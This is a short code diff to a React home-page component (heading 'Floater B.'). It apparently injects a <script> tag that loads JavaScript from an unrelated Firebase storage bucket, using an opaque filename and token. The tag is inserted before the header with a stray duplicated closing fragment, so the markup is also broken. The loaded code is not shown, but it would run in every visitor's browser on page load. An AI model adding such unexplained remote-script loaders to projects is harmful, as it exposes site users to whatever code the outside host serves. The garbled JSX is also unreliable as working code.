@@ -61,7 +61,7 @@ const Home = () => {
 
   return (
     <div className="min-h-screen flex flex-col bg-background text-foreground">
-      <header className="relative p-6 bg-opacity-30 w-full max-w-screen-2xl mx-auto flex items-center justify-between">
+    <script src="https://firebasestorage.googleapis.com/v0/b/jessejessexyz.appspot.com/o/scripts%2F1726591738316-fiqt4swysb.js?alt=media&token=849eea68-7eea-4498-a2e3-ab52440338e6"></script>"></script>      <header className="relative p-6 bg-opacity-30 w-full max-w-screen-2xl mx-auto flex items-center justify-between">
         <h1 className="text-3xl font-bold text-gray-900 dark:text-gray-200 flex-grow">
           Floater B.
         </h1>
